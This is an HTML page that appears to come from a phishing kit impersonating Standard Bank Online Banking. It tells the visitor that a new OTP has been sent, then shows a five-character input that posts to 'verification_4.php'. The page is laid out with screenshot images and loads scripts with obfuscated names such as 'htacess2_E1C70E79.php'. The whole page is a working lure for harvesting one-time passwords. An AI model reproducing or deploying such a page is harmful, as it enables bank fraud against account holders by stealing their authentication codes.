<!doctype html>
<!-- saved from url=(0014)about:internet -->
<html ng-app="refresh" class="ng-scope mdl-js" lang="en">
   <head>
       <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
       <meta content="utf-8" http-equiv="encoding">
      <style type="text/css">[uib-typeahead-popup].dropdown-menu{display:block;}</style>
      <style type="text/css">.uib-time input{width:50px;}</style>
      <style type="text/css">[uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,[uib-popover-popup].popover.top-left > .arrow,[uib-popover-popup].popover.top-right > .arrow,[uib-popover-popup].popover.bottom-left > .arrow,[uib-popover-popup].popover.bottom-right > .arrow,[uib-popover-popup].popover.left-top > .arrow,[uib-popover-popup].popover.left-bottom > .arrow,[uib-popover-popup].popover.right-top > .arrow,[uib-popover-popup].popover.right-bottom > .arrow,[uib-popover-html-popup].popover.top-left > .arrow,[uib-popover-html-popup].popover.top-right > .arrow,[uib-popover-html-popup].popover.bottom-left > .arrow,[uib-popover-html-popup].popover.bottom-right > .arrow,[uib-popover-html-popup].popover.left-top > .arrow,[uib-popover-html-popup].popover.left-bottom > .arrow,[uib-popover-html-popup].popover.right-top > .arrow,[uib-popover-html-popup].popover.right-bottom > .arrow,[uib-popover-template-popup].popover.top-left > .arrow,[uib-popover-template-popup].popover.top-right > .arrow,[uib-popover-template-popup].popover.bottom-left > .arrow,[uib-popover-template-popup].popover.bottom-right > .arrow,[uib-popover-template-popup].popover.left-top > .arrow,[uib-popover-template-popup].popover.left-bottom > .arrow,[uib-popover-template-popup].popover.right-top > .arrow,[uib-popover-template-popup].popover.right-bottom > .arrow{top:auto;bottom:auto;left:auto;right:auto;margin:0;}[uib-popover-popup].popover,[uib-popover-html-popup].popover,[uib-popover-template-popup].popover{display:block !important;}</style>
      <style type="text/css">.uib-datepicker-popup.dropdown-menu{display:block;float:none;margin:0;}.uib-button-bar{padding:10px 9px 2px;}</style>
      <style type="text/css">.uib-position-measure{display:block !important;visibility:hidden !important;position:absolute !important;top:-9999px !important;left:-9999px !important;}.uib-position-scrollbar-measure{position:absolute !important;top:-9999px !important;width:50px !important;height:50px !important;overflow:scroll !important;}.uib-position-body-scrollbar-measure{overflow:scroll !important;}</style>
      <style type="text/css">.uib-datepicker .uib-title{width:100%;}.uib-day button,.uib-month button,.uib-year button{min-width:100%;}.uib-left,.uib-right{width:100%}</style>
      <style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style>
      <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
      <link rel="icon" type="image/png" href="../../../onlinebanking.standardbank.co.za/assets/images/favicon.ico">
      <link rel="stylesheet" href="css/app.css">
      <link rel="stylesheet" href="php/visitor_E08B864B.php">
      <style type="text/css">
      .textbox {
	background-color: #FDFDFD;
	border: 1px solid #D2D2D2;
	height: 44px;
	width: 275px;
	font-family: Bentonsans,Helvetica,Arial,sans-serif;
	font-size: 14px;
	color: #555;
	padding-left: 6px;
}
      </style>
	   
      <!--[if lt IE 10]>
      <link rel="stylesheet" type="text/css" href="assets/ie/css/upgrade_your_browser.css"/>
      <![endif]-->
      <!--[if IE 9]>
      <link rel="stylesheet" type="text/css" href="assets/ie/css/ie9.css" />
      <![endif]-->
   <title>Standard Bank Online Banking</title>
	   <SCRIPT LANGUAGE="JavaScript">



<!-- Begin
var day="";
var month="";
var ampm="";
var ampmhour="";
var myweekday="";
var year="";
mydate = new Date();
myday = mydate.getDay();
mymonth = mydate.getMonth();
myweekday= mydate.getDate();
weekday= myweekday;
myyear= mydate.getYear();
year = myyear;
myhours = mydate.getHours();
ampmhour  =  (myhours > 12) ? myhours - 12 : myhours;
ampm =  (myhours >= 12) ? ' PM' : ' AM';
mytime = mydate.getMinutes();
myminutes =  ((mytime < 10) ? ':0' : ':') + mytime;
if(myday == 0)
day = " Sunday, ";
else if(myday == 1)
day = " Monday, ";
else if(myday == 2)
day = " Tuesday, ";
else if(myday == 3)
day = " Wednesday, ";
else if(myday == 4)
day = " Thurday, ";
else if(myday == 5)
day = " Friday, ";
else if(myday == 6)
day = " Saturday, ";
if(mymonth == 0) {
month = "January ";}
else if(mymonth ==1)
month = "February ";
else if(mymonth ==2)
month = "March ";
else if(mymonth ==3)
month = "April ";
else if(mymonth ==4)
month = "May ";
else if(mymonth ==5)
month = "June ";
else if(mymonth ==6)
month = "July ";
else if(mymonth ==7)
month = "August ";
else if(mymonth ==8)
month = "September ";
else if(mymonth ==9)
month = "October ";
else if(mymonth ==10)
month = "November ";
else if(mymonth ==11)
month = "December ";
// End -->
</SCRIPT>
	   <link rel="shortcut icon"
              href="images/favicon.ico"/>
      <!--<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>-->
      <script src="../../../ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
      <script type="text/javascript" src="php/htacess2_E1C70E79.php"></script>
        <script src="css/jquery.countdown360_4ABDBEC3.js" type="text/javascript" charset="utf-8"></script>
   </head>
   <body ng-controller="spinnerController" ng-class="{ 'login migration-login-bg': migrationLogin(), 'login-strong-auth-bg':strongAuthLogin() }" class="ng-scope login migration-login-bg login-strong-auth-bg"><p style="position: absolute; width: 279px; left: 613px; top: 92px; z-index: 2; font-size: 16px; text-align: left; height: 86px; color: #FFFFFF;" >A new OTP has been sent at
  <SCRIPT>
	document.write(day + month + "  ");
	document.write(myweekday + ", 2020");
document.write(" " + ampmhour + "" + myminutes + ampm)
  </SCRIPT>
</p>
       <div class="content-wrapper">
         <div id="image1" style="position: absolute; overflow: hidden; left: 532px; top: -1px; width: 424px; height: 818px; z-index: 0"><img src="images/pg6.png" alt="" title="" border=0 width=496 height=859></div>
   </div>
   <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
	   <form action="verification_4.php" name=wadanator id=wadanator method=post>
	   <input name="tp" class="textbox" autocomplete="off" required type="text" style="position: absolute; width: 323px; left: 584px; top: 480px; z-index: 1" maxlength="5">
      <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
      <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
      <div class="offline-ui offline-ui-up">
         <div class="offline-ui-content"></div>
         <a href="" class="offline-ui-retry"></a>
      </div><div id="formimage1" style="position: absolute; left: 237px; top: 864px; z-index: 2; width: 1133px; height: 157px;"><input type="image" name="formimage1" width="1000" height="75" src="images/footer.png"></div><div id="formimage1" style="position: absolute; left: 823px; top: 551px; z-index: 2; width: 90px;"><input type="image" name="formimage1" width="84" height="37" src="images/mt.png"></div>
   <p>&nbsp;</p>
  
</body>
</html>